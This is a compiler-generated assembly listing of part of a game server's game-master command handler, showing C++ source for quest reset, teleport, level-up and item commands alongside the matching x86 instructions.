; 3438 : 		                              lpObj->pInventory[nPos].m_Option1, 
; 3439 : 									  lpObj->pInventory[nPos].m_Option2,
; 3440 : 									  lpObj->pInventory[nPos].m_Option3,
; 3441 : 									  lpObj->pInventory[nPos].m_NewOption,
; 3442 : 									  lpObj->pInventory[nPos].m_SetOption,
; 3443 : 									  lpObj->pInventory[nPos].m_ItemOptionEx);
; 3444 : #else
; 3445 : 			lpObj->pInventory[nPos].Convert(lpObj->pInventory[nPos].m_Type, 

  02ab9	6a 01		 push	 1
  02abb	69 85 00 f5 ff
	ff a8 00 00 00	 imul	 eax, DWORD PTR _nPos$55[ebp], 168
  02ac5	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02ac8	8b 91 5c 0c 00
	00		 mov	 edx, DWORD PTR [ecx+3164]
  02ace	0f b6 84 02 92
	00 00 00	 movzx	 eax, BYTE PTR [edx+eax+146]
  02ad6	50		 push	 eax
  02ad7	69 8d 00 f5 ff
	ff a8 00 00 00	 imul	 ecx, DWORD PTR _nPos$55[ebp], 168
  02ae1	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  02ae4	8b 82 5c 0c 00
	00		 mov	 eax, DWORD PTR [edx+3164]
  02aea	0f b6 4c 08 7b	 movzx	 ecx, BYTE PTR [eax+ecx+123]
  02aef	51		 push	 ecx
  02af0	69 95 00 f5 ff
	ff a8 00 00 00	 imul	 edx, DWORD PTR _nPos$55[ebp], 168
  02afa	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02afd	8b 88 5c 0c 00
	00		 mov	 ecx, DWORD PTR [eax+3164]
  02b03	0f b6 54 11 7a	 movzx	 edx, BYTE PTR [ecx+edx+122]
  02b08	52		 push	 edx
  02b09	69 85 00 f5 ff
	ff a8 00 00 00	 imul	 eax, DWORD PTR _nPos$55[ebp], 168
  02b13	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02b16	8b 91 5c 0c 00
	00		 mov	 edx, DWORD PTR [ecx+3164]
  02b1c	0f b6 44 02 79	 movzx	 eax, BYTE PTR [edx+eax+121]
  02b21	50		 push	 eax
  02b22	69 8d 00 f5 ff
	ff a8 00 00 00	 imul	 ecx, DWORD PTR _nPos$55[ebp], 168
  02b2c	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  02b2f	8b 82 5c 0c 00
	00		 mov	 eax, DWORD PTR [edx+3164]
  02b35	0f b6 4c 08 78	 movzx	 ecx, BYTE PTR [eax+ecx+120]
  02b3a	51		 push	 ecx
  02b3b	69 95 00 f5 ff
	ff a8 00 00 00	 imul	 edx, DWORD PTR _nPos$55[ebp], 168
  02b45	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02b48	8b 88 5c 0c 00
	00		 mov	 ecx, DWORD PTR [eax+3164]
  02b4e	0f bf 54 11 06	 movsx	 edx, WORD PTR [ecx+edx+6]
  02b53	52		 push	 edx
  02b54	69 8d 00 f5 ff
	ff a8 00 00 00	 imul	 ecx, DWORD PTR _nPos$55[ebp], 168
  02b5e	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02b61	03 88 5c 0c 00
	00		 add	 ecx, DWORD PTR [eax+3164]
  02b67	e8 00 00 00 00	 call	 ?Convert@CItem@@QAEXHEEEEEE@Z ; CItem::Convert

; 3446 : 		                              lpObj->pInventory[nPos].m_Option1, 
; 3447 : 									  lpObj->pInventory[nPos].m_Option2,
; 3448 : 									  lpObj->pInventory[nPos].m_Option3,
; 3449 : 									  lpObj->pInventory[nPos].m_NewOption,
; 3450 : 									  lpObj->pInventory[nPos].m_SetOption);
; 3451 : #endif // ADD_380ITEM_NEWOPTION_20060711
; 3452 : 
; 3453 : 		}
; 3454 : 		break;

  02b6c	e9 4b 11 00 00	 jmp	 $LN2@Management
$LN240@Management:

; 3455 : 
; 3456 : #ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	
; 3457 : 	case GMCMD_ILLUSION_TEMPLE_READY:
; 3458 : 		g_IllusionTempleEvent.SetIllusionTempleState(ILLUSION_TEMPLE_STATE_READY, lpObj->MapNumber);
; 3459 : 		break;
; 3460 : 	case GMCMD_ILLUSION_TEMPLE_START:
; 3461 : 		g_IllusionTempleEvent.SetIllusionTempleState(ILLUSION_TEMPLE_STATE_PLAYING, lpObj->MapNumber);
; 3462 : 		break;
; 3463 : 	case GMCMD_ILLUSION_TEMPLE_END:	
; 3464 : 		g_IllusionTempleEvent.SetIllusionTempleState(ILLUSION_TEMPLE_STATE_END, lpObj->MapNumber);
; 3465 : 		break;
; 3466 : 	case GMCMD_ILLUSION_TEMPLE_RESET:
; 3467 : 		break;
; 3468 : #endif	// ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328
; 3469 : 
; 3470 : 	case GMCMD_QUESTRESET :
; 3471 : 		{	//  
; 3472 : 			BYTE	QuestBitMask[8];
; 3473 : 			QuestBitMask[0] = 0xFC;

  02b71	b8 01 00 00 00	 mov	 eax, 1
  02b76	6b c8 00	 imul	 ecx, eax, 0
  02b79	c6 84 0d f4 f4
	ff ff fc	 mov	 BYTE PTR _QuestBitMask$53[ebp+ecx], 252 ; 000000fcH

; 3474 : 			QuestBitMask[1] = 0xFC;

  02b81	b8 01 00 00 00	 mov	 eax, 1
  02b86	c1 e0 00	 shl	 eax, 0
  02b89	c6 84 05 f4 f4
	ff ff fc	 mov	 BYTE PTR _QuestBitMask$53[ebp+eax], 252 ; 000000fcH

; 3475 : 			QuestBitMask[2] = 0xF3;

  02b91	b8 01 00 00 00	 mov	 eax, 1
  02b96	d1 e0		 shl	 eax, 1
  02b98	c6 84 05 f4 f4
	ff ff f3	 mov	 BYTE PTR _QuestBitMask$53[ebp+eax], 243 ; 000000f3H

; 3476 : 			QuestBitMask[3] = 0xF3;

  02ba0	b8 01 00 00 00	 mov	 eax, 1
  02ba5	6b c8 03	 imul	 ecx, eax, 3
  02ba8	c6 84 0d f4 f4
	ff ff f3	 mov	 BYTE PTR _QuestBitMask$53[ebp+ecx], 243 ; 000000f3H

; 3477 : 
; 3478 : 			QuestBitMask[4] = 0xCF;

  02bb0	b8 01 00 00 00	 mov	 eax, 1
  02bb5	c1 e0 02	 shl	 eax, 2
  02bb8	c6 84 05 f4 f4
	ff ff cf	 mov	 BYTE PTR _QuestBitMask$53[ebp+eax], 207 ; 000000cfH

; 3479 : 			QuestBitMask[5] = 0xCF;

  02bc0	b8 01 00 00 00	 mov	 eax, 1
  02bc5	6b c8 05	 imul	 ecx, eax, 5
  02bc8	c6 84 0d f4 f4
	ff ff cf	 mov	 BYTE PTR _QuestBitMask$53[ebp+ecx], 207 ; 000000cfH

; 3480 : 			QuestBitMask[6] = 0x3F;

  02bd0	b8 01 00 00 00	 mov	 eax, 1
  02bd5	6b c8 06	 imul	 ecx, eax, 6
  02bd8	c6 84 0d f4 f4
	ff ff 3f	 mov	 BYTE PTR _QuestBitMask$53[ebp+ecx], 63 ; 0000003fH

; 3481 : 			QuestBitMask[7] = 0x3F;

  02be0	b8 01 00 00 00	 mov	 eax, 1
  02be5	6b c8 07	 imul	 ecx, eax, 7
  02be8	c6 84 0d f4 f4
	ff ff 3f	 mov	 BYTE PTR _QuestBitMask$53[ebp+ecx], 63 ; 0000003fH

; 3482 : 
; 3483 : 			int questindex= GetTokenNumber();

  02bf0	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02bf3	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02bf8	89 85 f0 f4 ff
	ff		 mov	 DWORD PTR _questindex$52[ebp], eax

; 3484 : 			if( questindex == 0 )

  02bfe	83 bd f0 f4 ff
	ff 00		 cmp	 DWORD PTR _questindex$52[ebp], 0
  02c05	75 35		 jne	 SHORT $LN241@Management

; 3485 : 			{	//  				
; 3486 : 				memset(lpObj->m_Quest, 0xff, MAX_DBQUEST);

  02c07	6a 32		 push	 50			; 00000032H
  02c09	68 ff 00 00 00	 push	 255			; 000000ffH
  02c0e	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02c11	05 90 0e 00 00	 add	 eax, 3728		; 00000e90H
  02c16	50		 push	 eax
  02c17	e8 00 00 00 00	 call	 _memset
  02c1c	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3487 : 				lpObj->m_SendQuestInfo = FALSE;

  02c1f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02c22	c6 80 c2 0e 00
	00 00		 mov	 BYTE PTR [eax+3778], 0

; 3488 : 				CGRequestQuestInfo(lpObj->m_Index);

  02c29	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02c2c	8b 08		 mov	 ecx, DWORD PTR [eax]
  02c2e	51		 push	 ecx
  02c2f	e8 00 00 00 00	 call	 ?CGRequestQuestInfo@@YAXH@Z ; CGRequestQuestInfo
  02c34	83 c4 04	 add	 esp, 4

; 3489 : 			}

  02c37	e9 b2 00 00 00	 jmp	 $LN242@Management
$LN241@Management:

; 3490 : 			else
; 3491 : 			{
; 3492 : 				int State = QS_NOTHING;

  02c3c	c7 85 ec f4 ff
	ff 03 00 00 00	 mov	 DWORD PTR _State$51[ebp], 3

; 3493 : 
; 3494 : 				int index = questindex/4;

  02c46	8b 85 f0 f4 ff
	ff		 mov	 eax, DWORD PTR _questindex$52[ebp]
  02c4c	99		 cdq
  02c4d	83 e2 03	 and	 edx, 3
  02c50	03 c2		 add	 eax, edx
  02c52	c1 f8 02	 sar	 eax, 2
  02c55	89 85 e8 f4 ff
	ff		 mov	 DWORD PTR _index$50[ebp], eax

; 3495 : 				int shift = (questindex%4)*2;

  02c5b	8b 85 f0 f4 ff
	ff		 mov	 eax, DWORD PTR _questindex$52[ebp]
  02c61	25 03 00 00 80	 and	 eax, -2147483645	; 80000003H
  02c66	79 05		 jns	 SHORT $LN331@Management
  02c68	48		 dec	 eax
  02c69	83 c8 fc	 or	 eax, -4			; fffffffcH
  02c6c	40		 inc	 eax
$LN331@Management:
  02c6d	d1 e0		 shl	 eax, 1
  02c6f	89 85 e4 f4 ff
	ff		 mov	 DWORD PTR _shift$49[ebp], eax

; 3496 : 				
; 3497 : 				(lpObj->m_Quest[index]) &= QuestBitMask[shift];

  02c75	8b 85 e4 f4 ff
	ff		 mov	 eax, DWORD PTR _shift$49[ebp]
  02c7b	0f b6 8c 05 f4
	f4 ff ff	 movzx	 ecx, BYTE PTR _QuestBitMask$53[ebp+eax]
  02c83	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  02c86	03 95 e8 f4 ff
	ff		 add	 edx, DWORD PTR _index$50[ebp]
  02c8c	0f b6 82 90 0e
	00 00		 movzx	 eax, BYTE PTR [edx+3728]
  02c93	23 c1		 and	 eax, ecx
  02c95	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02c98	03 8d e8 f4 ff
	ff		 add	 ecx, DWORD PTR _index$50[ebp]
  02c9e	88 81 90 0e 00
	00		 mov	 BYTE PTR [ecx+3728], al

; 3498 : 				(lpObj->m_Quest[index]) |= ((State&0x3)<<shift);

  02ca4	8b 85 ec f4 ff
	ff		 mov	 eax, DWORD PTR _State$51[ebp]
  02caa	83 e0 03	 and	 eax, 3
  02cad	8b 8d e4 f4 ff
	ff		 mov	 ecx, DWORD PTR _shift$49[ebp]
  02cb3	d3 e0		 shl	 eax, cl
  02cb5	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02cb8	03 8d e8 f4 ff
	ff		 add	 ecx, DWORD PTR _index$50[ebp]
  02cbe	0f b6 91 90 0e
	00 00		 movzx	 edx, BYTE PTR [ecx+3728]
  02cc5	0b d0		 or	 edx, eax
  02cc7	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02cca	03 85 e8 f4 ff
	ff		 add	 eax, DWORD PTR _index$50[ebp]
  02cd0	88 90 90 0e 00
	00		 mov	 BYTE PTR [eax+3728], dl

; 3499 : 				lpObj->m_SendQuestInfo = FALSE;

  02cd6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02cd9	c6 80 c2 0e 00
	00 00		 mov	 BYTE PTR [eax+3778], 0

; 3500 : 				CGRequestQuestInfo(lpObj->m_Index);

  02ce0	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02ce3	8b 08		 mov	 ecx, DWORD PTR [eax]
  02ce5	51		 push	 ecx
  02ce6	e8 00 00 00 00	 call	 ?CGRequestQuestInfo@@YAXH@Z ; CGRequestQuestInfo
  02ceb	83 c4 04	 add	 esp, 4
$LN242@Management:

; 3501 : 			}
; 3502 : 
; 3503 : #ifdef MODIFY_QUEST_SYSTEM_20070525	// /    
; 3504 : 			lpObj->m_iQuestMonKillDBIndex = -1;
; 3505 : 			
; 3506 : 			for( int i = 0; i < MAX_QUEST_MONSTER_KILL_INFO; i++ )
; 3507 : 			{
; 3508 : 				lpObj->m_QuestMonKillInfo[i].iQuestMonIndex	= -1;
; 3509 : 				lpObj->m_QuestMonKillInfo[i].iKillCount		= -1;
; 3510 : 			}				
; 3511 : #endif
; 3512 : 		}
; 3513 : 	break;

  02cee	e9 c9 0f 00 00	 jmp	 $LN2@Management
$LN243@Management:

; 3514 : 
; 3515 : 	case GMCMD_CHANGEPOS :
; 3516 : 		{	//  (ex> /  X Y)
; 3517 : 			int map, x, y;
; 3518 : 			map = GetTokenNumber();

  02cf3	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02cf6	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02cfb	89 85 e0 f4 ff
	ff		 mov	 DWORD PTR _map$48[ebp], eax

; 3519 : 			x   = GetTokenNumber();

  02d01	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02d04	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02d09	89 85 dc f4 ff
	ff		 mov	 DWORD PTR _x$47[ebp], eax

; 3520 : 			y   = GetTokenNumber();

  02d0f	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02d12	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02d17	89 85 d8 f4 ff
	ff		 mov	 DWORD PTR _y$46[ebp], eax

; 3521 : 
; 3522 : 			if (!CHECK_LIMIT(map, g_TerrainManager.Size()))

  02d1d	83 bd e0 f4 ff
	ff 00		 cmp	 DWORD PTR _map$48[ebp], 0
  02d24	7d 0c		 jge	 SHORT $LN312@Management
  02d26	c7 85 84 e5 ff
	ff 00 00 00 00	 mov	 DWORD PTR tv1964[ebp], 0
  02d30	eb 37		 jmp	 SHORT $LN313@Management
$LN312@Management:
  02d32	b9 00 00 00 00	 mov	 ecx, OFFSET ?g_TerrainManager@@3VCTerrainManager@@A ; g_TerrainManager
  02d37	e8 00 00 00 00	 call	 ?Size@CTerrainManager@@QAE?BHXZ ; CTerrainManager::Size
  02d3c	83 e8 01	 sub	 eax, 1
  02d3f	39 85 e0 f4 ff
	ff		 cmp	 DWORD PTR _map$48[ebp], eax
  02d45	7e 0c		 jle	 SHORT $LN310@Management
  02d47	c7 85 80 e5 ff
	ff 00 00 00 00	 mov	 DWORD PTR tv1963[ebp], 0
  02d51	eb 0a		 jmp	 SHORT $LN311@Management
$LN310@Management:
  02d53	c7 85 80 e5 ff
	ff 01 00 00 00	 mov	 DWORD PTR tv1963[ebp], 1
$LN311@Management:
  02d5d	8b 85 80 e5 ff
	ff		 mov	 eax, DWORD PTR tv1963[ebp]
  02d63	89 85 84 e5 ff
	ff		 mov	 DWORD PTR tv1964[ebp], eax
$LN313@Management:
  02d69	83 bd 84 e5 ff
	ff 00		 cmp	 DWORD PTR tv1964[ebp], 0
  02d70	75 05		 jne	 SHORT $LN244@Management

; 3523 : 				break;

  02d72	e9 45 0f 00 00	 jmp	 $LN2@Management
$LN244@Management:

; 3524 : 			if (!CHECK_LIMIT(x, 256))

  02d77	83 bd dc f4 ff
	ff 00		 cmp	 DWORD PTR _x$47[ebp], 0
  02d7e	7d 0c		 jge	 SHORT $LN316@Management
  02d80	c7 85 84 e5 ff
	ff 00 00 00 00	 mov	 DWORD PTR tv1969[ebp], 0
  02d8a	eb 2e		 jmp	 SHORT $LN317@Management
$LN316@Management:
  02d8c	81 bd dc f4 ff
	ff ff 00 00 00	 cmp	 DWORD PTR _x$47[ebp], 255 ; 000000ffH
  02d96	7e 0c		 jle	 SHORT $LN314@Management
  02d98	c7 85 80 e5 ff
	ff 00 00 00 00	 mov	 DWORD PTR tv1968[ebp], 0
  02da2	eb 0a		 jmp	 SHORT $LN315@Management
$LN314@Management:
  02da4	c7 85 80 e5 ff
	ff 01 00 00 00	 mov	 DWORD PTR tv1968[ebp], 1
$LN315@Management:
  02dae	8b 85 80 e5 ff
	ff		 mov	 eax, DWORD PTR tv1968[ebp]
  02db4	89 85 84 e5 ff
	ff		 mov	 DWORD PTR tv1969[ebp], eax
$LN317@Management:
  02dba	83 bd 84 e5 ff
	ff 00		 cmp	 DWORD PTR tv1969[ebp], 0
  02dc1	75 05		 jne	 SHORT $LN245@Management

; 3525 : 				break;

  02dc3	e9 f4 0e 00 00	 jmp	 $LN2@Management
$LN245@Management:

; 3526 : 			if (!CHECK_LIMIT(y, 256))

  02dc8	83 bd d8 f4 ff
	ff 00		 cmp	 DWORD PTR _y$46[ebp], 0
  02dcf	7d 0c		 jge	 SHORT $LN320@Management
  02dd1	c7 85 84 e5 ff
	ff 00 00 00 00	 mov	 DWORD PTR tv1974[ebp], 0
  02ddb	eb 2e		 jmp	 SHORT $LN321@Management
$LN320@Management:
  02ddd	81 bd d8 f4 ff
	ff ff 00 00 00	 cmp	 DWORD PTR _y$46[ebp], 255 ; 000000ffH
  02de7	7e 0c		 jle	 SHORT $LN318@Management
  02de9	c7 85 80 e5 ff
	ff 00 00 00 00	 mov	 DWORD PTR tv1973[ebp], 0
  02df3	eb 0a		 jmp	 SHORT $LN319@Management
$LN318@Management:
  02df5	c7 85 80 e5 ff
	ff 01 00 00 00	 mov	 DWORD PTR tv1973[ebp], 1
$LN319@Management:
  02dff	8b 85 80 e5 ff
	ff		 mov	 eax, DWORD PTR tv1973[ebp]
  02e05	89 85 84 e5 ff
	ff		 mov	 DWORD PTR tv1974[ebp], eax
$LN321@Management:
  02e0b	83 bd 84 e5 ff
	ff 00		 cmp	 DWORD PTR tv1974[ebp], 0
  02e12	75 05		 jne	 SHORT $LN246@Management

; 3527 : 				break;

  02e14	e9 a3 0e 00 00	 jmp	 $LN2@Management
$LN246@Management:

; 3528 : 
; 3529 : 			BYTE btMapAttr = MapC[map].GetAttr(x, y);

  02e19	8b 85 d8 f4 ff
	ff		 mov	 eax, DWORD PTR _y$46[ebp]
  02e1f	50		 push	 eax
  02e20	8b 8d dc f4 ff
	ff		 mov	 ecx, DWORD PTR _x$47[ebp]
  02e26	51		 push	 ecx
  02e27	69 8d e0 f4 ff
	ff 8c 04 05 00	 imul	 ecx, DWORD PTR _map$48[ebp], 328844
  02e31	03 0d 00 00 00
	00		 add	 ecx, DWORD PTR ?MapC@@3PAVMapClass@@A ; MapC
  02e37	e8 00 00 00 00	 call	 ?GetAttr@MapClass@@QAEEHH@Z ; MapClass::GetAttr
  02e3c	88 85 d7 f4 ff
	ff		 mov	 BYTE PTR _btMapAttr$45[ebp], al

; 3530 : #ifdef UPDATE_GM_FUNCTION_20070228		// '/'  
; 3531 : 			if( ((btMapAttr&MAP_ATTR_BLOCK)==MAP_ATTR_BLOCK) ||				// 
; 3532 : 				((btMapAttr&MAP_ATTR_HOLLOW)==MAP_ATTR_HOLLOW)				// 
; 3533 : 				)
; 3534 : #else
; 3535 : 			if( ((btMapAttr&MAP_ATTR_SAFTYZONE)==MAP_ATTR_SAFTYZONE) ||		// 
; 3536 : 				((btMapAttr&MAP_ATTR_BLOCK)==MAP_ATTR_BLOCK) ||				// 

  02e42	0f b6 85 d7 f4
	ff ff		 movzx	 eax, BYTE PTR _btMapAttr$45[ebp]
  02e49	83 e0 01	 and	 eax, 1
  02e4c	75 18		 jne	 SHORT $LN248@Management
  02e4e	0f b6 85 d7 f4
	ff ff		 movzx	 eax, BYTE PTR _btMapAttr$45[ebp]
  02e55	83 e0 04	 and	 eax, 4
  02e58	75 0c		 jne	 SHORT $LN248@Management
  02e5a	0f b6 85 d7 f4
	ff ff		 movzx	 eax, BYTE PTR _btMapAttr$45[ebp]
  02e61	83 e0 08	 and	 eax, 8
  02e64	74 38		 je	 SHORT $LN247@Management
$LN248@Management:

; 3537 : 				((btMapAttr&MAP_ATTR_HOLLOW)==MAP_ATTR_HOLLOW)				// 
; 3538 : 				)
; 3539 : #endif
; 3540 : 			{
; 3541 : 
; 3542 : 				PMSG_NOTICE	pNotice;
; 3543 : 
; 3544 : #ifdef MODIFY_NOTICE_20040325
; 3545 : 				TNotice::MakeNoticeMsgEx( &pNotice, 0, "      . (:%d)", btMapAttr);

  02e66	0f b6 85 d7 f4
	ff ff		 movzx	 eax, BYTE PTR _btMapAttr$45[ebp]
  02e6d	50		 push	 eax
  02e6e	68 00 00 00 00	 push	 OFFSET ??_C@_0DK@FACDLFDK@?G?X?$LE?g?5?A?v?$LP?$KK?$MA?$LI?$LH?N?5?G?v?$MA?g?5?A?B?G?$KF?$MA?L?$LF?$LP?5?G?R?5@
  02e73	6a 00		 push	 0
  02e75	8d 8d c4 f3 ff
	ff		 lea	 ecx, DWORD PTR _pNotice$44[ebp]
  02e7b	51		 push	 ecx
  02e7c	e8 00 00 00 00	 call	 ?MakeNoticeMsgEx@TNotice@@SAXPAXEPADZZ ; TNotice::MakeNoticeMsgEx
  02e81	83 c4 10	 add	 esp, 16			; 00000010H

; 3546 : 				TNotice::SendNoticeToUser( lpObj->m_Index, &pNotice );

  02e84	8d 85 c4 f3 ff
	ff		 lea	 eax, DWORD PTR _pNotice$44[ebp]
  02e8a	50		 push	 eax
  02e8b	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02e8e	8b 11		 mov	 edx, DWORD PTR [ecx]
  02e90	52		 push	 edx
  02e91	e8 00 00 00 00	 call	 ?SendNoticeToUser@TNotice@@SAXHPAX@Z ; TNotice::SendNoticeToUser
  02e96	83 c4 08	 add	 esp, 8

; 3547 : #else
; 3548 : 				pNotice.type = 0;
; 3549 : 				wsprintf(pNotice.Notice, "      . (:%d)", btMapAttr);
; 3550 : 				PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
; 3551 : 				::DataSend(lpObj->m_Index, (LPBYTE)&pNotice, pNotice.h.size);
; 3552 : #endif
; 3553 : 
; 3554 : 				break;

  02e99	e9 1e 0e 00 00	 jmp	 $LN2@Management
$LN247@Management:

; 3555 : 			}
; 3556 : #ifdef ADD_NEWPVP_PKFIELD
; 3557 : 			{
; 3558 : 				g_NewPVP.Reset(*lpObj);
; 3559 : 			}
; 3560 : #endif // ADD_NEWPVP_PKFIELD
; 3561 : 			
; 3562 : 			gObjTeleport(lpObj->m_Index, map, x, y);

  02e9e	8b 85 d8 f4 ff
	ff		 mov	 eax, DWORD PTR _y$46[ebp]
  02ea4	50		 push	 eax
  02ea5	8b 8d dc f4 ff
	ff		 mov	 ecx, DWORD PTR _x$47[ebp]
  02eab	51		 push	 ecx
  02eac	8b 95 e0 f4 ff
	ff		 mov	 edx, DWORD PTR _map$48[ebp]
  02eb2	52		 push	 edx
  02eb3	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02eb6	8b 08		 mov	 ecx, DWORD PTR [eax]
  02eb8	51		 push	 ecx
  02eb9	e8 00 00 00 00	 call	 ?gObjTeleport@@YAXHHHH@Z ; gObjTeleport
  02ebe	83 c4 10	 add	 esp, 16			; 00000010H

; 3563 : #ifdef ADD_RAKLION_20080408
; 3564 : 			if( map == MAP_INDEX_RAKLION_BOSS )
; 3565 : 				g_RaklionBattleUserMng.AddUserData( lpObj->m_Index );
; 3566 : #endif // ADD_RAKLION_20080408
; 3567 : 		}
; 3568 : 	break;	

  02ec1	e9 f6 0d 00 00	 jmp	 $LN2@Management
$LN249@Management:

; 3569 : 
; 3570 : #ifdef ADD_MACRO_INIFINITY_ARROW_CONTROL_20060410
; 3571 : 	case GMCMD_GETINFINITYARROW_MP:
; 3572 : 		GetInfinityArrowMPConsumption( lpObj );
; 3573 : 		break;
; 3574 : 		
; 3575 : 	case GMCMD_SETINFINITYARROW_MP_0:
; 3576 : 		ControlInfinityArrowMPConsumption0( lpObj, GetTokenNumber() );
; 3577 : 		break;
; 3578 : 
; 3579 : 	case GMCMD_SETINFINITYARROW_MP_1:
; 3580 : 		ControlInfinityArrowMPConsumption1( lpObj, GetTokenNumber() );
; 3581 : 		break;
; 3582 : 
; 3583 : 	case GMCMD_SETINFINITYARROW_MP_2:
; 3584 : 		ControlInfinityArrowMPConsumption2( lpObj, GetTokenNumber() );
; 3585 : 		break;
; 3586 : 
; 3587 : #ifdef UPDATE_ADD_ARROW_TYPE_PLUS_3_20081106
; 3588 : 	case GMCMD_SETINFINITYARROW_MP_3:
; 3589 : 		ControlInfinityArrowMPConsumption3( lpObj, GetTokenNumber() );
; 3590 : 		break;
; 3591 : #endif // UPDATE_ADD_ARROW_TYPE_PLUS_3_20081106
; 3592 : 		
; 3593 : 	case GMCMD_INFINITYARROW_SETTIME:
; 3594 : 		SetInfinityArrowTime( lpObj, GetTokenNumber() );
; 3595 : 		break;
; 3596 : #endif	// #ifdef ADD_MACRO_INIFINITY_ARROW_CONTROL_20060410
; 3597 : 		
; 3598 : #ifdef MODIFY_LIFEANDMANA_BUG_LEVELUP_RELOGIN_20065018
; 3599 : 	case GMCMD_LEVELUP_TEST:
; 3600 : #ifdef BUGFIX_GAIN_EXP_20071210
; 3601 : 		{
; 3602 : 			INT64 iGetExp = GetTokenNumber();
; 3603 : 			gObjLevelUp( lpObj, iGetExp, 0, EVENT_TYPE_NONE );
; 3604 : 		}
; 3605 : #else
; 3606 : 
; 3607 : 	#ifdef MODIFY_EXP_LOG_MONSTER_EVENT_INDEX_20060906
; 3608 : 		gObjLevelUp(lpObj, GetTokenNumber(), 0, EVENT_TYPE_NONE );

  02ec6	6a 00		 push	 0
  02ec8	6a 00		 push	 0
  02eca	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02ecd	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02ed2	50		 push	 eax
  02ed3	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02ed6	50		 push	 eax
  02ed7	e8 00 00 00 00	 call	 ?gObjLevelUp@@YA_NPAVOBJECTSTRUCT@@HHH@Z ; gObjLevelUp
  02edc	83 c4 10	 add	 esp, 16			; 00000010H

; 3609 : 	#else
; 3610 : 		gObjLevelUp(lpObj, GetTokenNumber() );
; 3611 : 	#endif // MODIFY_EXP_LOG_MONSTER_EVENT_INDEX_20060906
; 3612 : #endif	// BUGFIX_GAIN_EXP_20071210
; 3613 : 		break;

  02edf	e9 d8 0d 00 00	 jmp	 $LN2@Management
$LN250@Management:

; 3614 : #endif // MODIFY_LIFEANDMANA_BUG_LEVELUP_RELOGIN_20065018
; 3615 : 
; 3616 : #ifdef ADD_SKILL_DARKLOAD_FIRESCREAM_20060601
; 3617 : 	case GMCMD_FIRE_SCREAM:
; 3618 : 		ControlFireScreamDoubleAttackDistance( lpObj, GetTokenNumber() );
; 3619 : 		break;		
; 3620 : #endif
; 3621 : 
; 3622 : #ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
; 3623 : 	case GMCMD_MAKE_STRENGTHENITEM:
; 3624 : 		{
; 3625 : 			int iInvenPosX = GetTokenNumber();
; 3626 : 			int iInvenPosY = GetTokenNumber();
; 3627 : 			int iOptionType = GetTokenNumber();
; 3628 : 			int iOptionLevel = GetTokenNumber();
; 3629 : 			// 
; 3630 : 			int pos = (iInvenPosY-1)*8 + (iInvenPosX-1) + EQUIPMENT_GOLD;
; 3631 : 			g_kJewelOfHarmonySystem.StrengthenItemByMacro( lpObj, pos, iOptionType, iOptionLevel );
; 3632 : 		}
; 3633 : 		break;
; 3634 : #endif // ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
; 3635 : 
; 3636 : #ifdef ADD_380ITEM_NEWOPTION_20060711
; 3637 : 	case GMCMD_MAKE_380OPTIONITEM:
; 3638 : 		{
; 3639 : 			int iInvenPosX = GetTokenNumber();
; 3640 : 			int iInvenPosY = GetTokenNumber();
; 3641 : 			int iOption    = GetTokenNumber();
; 3642 : 			// 
; 3643 : 			int pos = (iInvenPosY-1)*8 + (iInvenPosX-1) + EQUIPMENT_GOLD;
; 3644 : 
; 3645 : 			g_kItemSystemFor380.SetOptionItemByMacro( lpObj, pos, (BOOL)iOption);
; 3646 : 		}
; 3647 : 		break;
; 3648 : #endif // ADD_380ITEM_NEWOPTION_20060711
; 3649 : 
; 3650 : #ifdef ADD_PCS_LOTTERY_SYSTEM_20070117
; 3651 : 	case GMCMD_LOTTERY_ITEM_CREATE:
; 3652 : 		{
; 3653 : 			CItem LotteryItem;
; 3654 : 
; 3655 : #ifdef MODIFY_EXPEND_CHAOSCARD_SYSTEM_20080326
; 3656 : 			char szCardName[50];
; 3657 : 
; 3658 : 			ZeroMemory( szCardName, sizeof(szCardName) );
; 3659 : 			strcpy( szCardName, GetTokenString() );
; 3660 : 			
; 3661 : 			g_EventItemBagExMng.GetItem( szCardName, &LotteryItem );
; 3662 : 			if( LotteryItem.IsItem() == FALSE )
